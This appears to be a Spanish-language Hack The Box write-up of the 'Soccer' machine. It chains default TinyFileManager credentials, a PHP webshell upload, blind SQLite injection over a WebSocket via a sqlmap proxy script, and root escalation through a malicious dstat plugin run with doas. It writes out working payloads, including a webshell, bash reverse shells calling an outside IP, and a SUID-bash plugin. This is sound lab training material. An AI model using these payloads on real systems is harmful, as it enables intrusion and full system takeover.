---
title: "Soccer"
description: "Writeup de Soccer - Hack The Box - Dificultad: Easy. TinyFileManager credenciales por defecto → webshell PHP → SQLite blind SQLi en WebSocket → SSH como player → dstat doas privesc."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - tinyfilemanager
  - php-webshell
  - websocket
  - sqli-blind
  - sqlite
  - doas
  - dstat
  - gtfobins
---

# 🐧 Soccer

> 📅 Fecha: 2026-06-02
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 20.04.6 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 3h 00m
> 🌐 IP: `10.129.6.205`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [TinyFileManager → webshell como www-data](#-tinyfilemanager--webshell-como-www-data)
- [SQLite blind SQLi en WebSocket → SSH como player](#-sqlite-blind-sqli-en-websocket--ssh-como-player)
- [Escalada: doas dstat → root](#-escalada-doas-dstat--root)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Soccer expone TinyFileManager 2.4.3 en `/tiny/` con credenciales por defecto (`admin:admin@123`). La funcionalidad de subida de archivos sin restricciones permite cargar una webshell PHP → shell como `www-data`. En el archivo de configuración de nginx se encuentra el vhost `soc-player.soccer.htb`, cuyo portal de tickets usa WebSocket en el puerto `9091` para consultar el estado de tickets por ID — parámetro injectable en SQLite (blind). `sqlmap` con el WebSocket extrae credenciales de `player` → SSH. La escalada usa `doas` (alternativa a sudo) que permite a `player` ejecutar `dstat` como root. Un plugin de dstat en `~/.dstat/` con código arbitrario Python se ejecuta como root al invocar `doas dstat --plugin`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | TinyFileManager creds por defecto, SQLite blind SQLi en WebSocket, dstat plugin injection vía doas |
| Herramientas | `nmap`, `ffuf`, `curl`, `burpsuite`, `sqlmap`, `nc`, `ssh` |
| Tiempo total | ~3h 00m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.6.205
```

```text
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index
9091/tcp open  xmltec-xmlmail?
```

Puerto `9091` no identificado — es el servidor WebSocket. Dominio: `soccer.htb`.

```bash
echo "10.129.6.205 soccer.htb" | sudo tee -a /etc/hosts
```

Enumeración de directorios:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u http://soccer.htb/FUZZ -mc 200,301,302
```

```text
tiny   [Status: 301, Size: 178]
```

---

## 📁 TinyFileManager → webshell como www-data

`http://soccer.htb/tiny/` → login de TinyFileManager 2.4.3.

Credenciales por defecto: `admin:admin@123`

Una vez autenticado, navegar a `/tiny/uploads/` → botón Upload. Subir una webshell PHP:

```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>
```

Verificar ejecución:

```bash
curl "http://soccer.htb/tiny/uploads/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```bash
# Listener
nc -lvnp 4444

# Payload
curl "http://soccer.htb/tiny/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.130/4444+0>%261'"
```

---

## 🔌 SQLite blind SQLi en WebSocket → SSH como player

Desde la shell de `www-data`, leer configuración de nginx:

```bash
cat /etc/nginx/sites-enabled/soc-player.htb
```

```text
server {
    listen 80;
    server_name soc-player.soccer.htb;
    root /var/www/soc-player/public;
    ...
    location /check {
        proxy_pass http://localhost:3000;
    }
}
```

```bash
echo "10.129.6.205 soc-player.soccer.htb" | sudo tee -a /etc/hosts
```

`http://soc-player.soccer.htb/` → portal de registro de cuentas para el club. Registrar una cuenta → funcionalidad de "Mi Ticket" que consulta el estado via WebSocket (`ws://soc-player.soccer.htb:9091`).

El mensaje WebSocket enviado:

```json
{"id":"123456"}
```

El parámetro `id` es vulnerable a SQLi ciega (SQLite). Configurar sqlmap con WebSocket:

```python
# websocket_proxy.py — proxy HTTP para sqlmap
from http.server import HTTPServer, BaseHTTPRequestHandler
import websocket, json

class Proxy(BaseHTTPRequestHandler):
    def do_GET(self):
        ticket_id = self.path.split('?id=')[1]
        ws = websocket.create_connection("ws://soc-player.soccer.htb:9091")
        ws.send(json.dumps({"id": ticket_id}))
        result = ws.recv()
        ws.close()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(result.encode())

HTTPServer(('127.0.0.1', 8888), Proxy).serve_forever()
```

```bash
python3 websocket_proxy.py &
sqlmap -u "http://127.0.0.1:8888/?id=1" --dbs --batch
```

```text
available databases: soccer_db
```

```bash
sqlmap -u "http://127.0.0.1:8888/?id=1" -D soccer_db -T accounts --dump --batch
```

```text
+--------+-------------------+----------------------+
| email  | username          | password             |
+--------+-------------------+----------------------+
| ...    | player            | PlayerOftheMatch2022 |
+--------+-------------------+----------------------+
```

```bash
ssh player@soccer.htb
# password: PlayerOftheMatch2022
```

```bash
player@soccer:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada: doas dstat → root

```bash
find / -name doas.conf 2>/dev/null
cat /usr/local/etc/doas.conf
```

```text
permit nopass player as root cmd /usr/bin/dstat
```

`dstat` carga plugins de Python desde `~/.dstat/`. Un plugin malicioso:

```bash
mkdir -p /home/player/.dstat
cat > /home/player/.dstat/dstat_exploit.py << 'EOF'
import os
os.system('chmod +s /bin/bash')
EOF
```

```bash
doas /usr/bin/dstat --exploit
```

```text
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated...
```

```bash
bash -p
bash-5.0# id
uid=1001(player) gid=1001(player) euid=0(root)
bash-5.0# cat /root/root.txt
[root flag]
```

Alternativamente, reverse shell directa desde el plugin:

```python
# dstat_exploit.py
import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.130/5555 0>&1"')
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. ffuf → /tiny/ → TinyFileManager 2.4.3
        ↓
2. Credenciales por defecto admin:admin@123 → subida de webshell PHP
        ↓
3. shell como www-data → /etc/nginx/sites-enabled → soc-player.soccer.htb
        ↓
4. WebSocket en puerto 9091 → SQLite blind SQLi en parámetro "id"
        ↓
5. sqlmap via proxy WebSocket → player:PlayerOftheMatch2022
        ↓
6. SSH player@soccer.htb → user.txt
        ↓
7. /usr/local/etc/doas.conf → dstat NOPASSWD como root
        ↓
8. Plugin ~/.dstat/dstat_exploit.py → SUID bash o reverse shell como root → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **TinyFileManager credenciales por defecto**: documentadas públicamente en el README del proyecto. Siempre cambiar antes de producción. La funcionalidad de upload sin restricciones convierte cualquier login en RCE.
- **SQLi en WebSocket**: los WebSockets no son inmunes a inyección — el servidor backend procesa el JSON con el mismo (des)cuidado que un endpoint HTTP. Las herramientas estándar como sqlmap requieren un proxy intermedio para convertir el protocolo.
- **doas vs sudo**: `doas` es el equivalente de OpenBSD a sudo, usado en algunas distribuciones Linux. Tiene la misma lógica de GTFOBins: cualquier binario que cargue código externo (plugins, módulos) es explotable si tiene permiso doas/sudo.
- **Enumeración de vhosts desde la shell**: tras obtener acceso www-data, leer `/etc/nginx/sites-enabled/*` y `/etc/apache2/sites-enabled/*` frecuentemente revela dominios y aplicaciones internas no visibles desde el exterior.

---

## 📚 Referencias

- [TinyFileManager — GitHub](https://github.com/prasathmani/tinyfilemanager)
- [GTFOBins — dstat](https://gtfobins.github.io/gtfobins/dstat/)
- [HackTricks — WebSocket SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection#websocket-sqli)
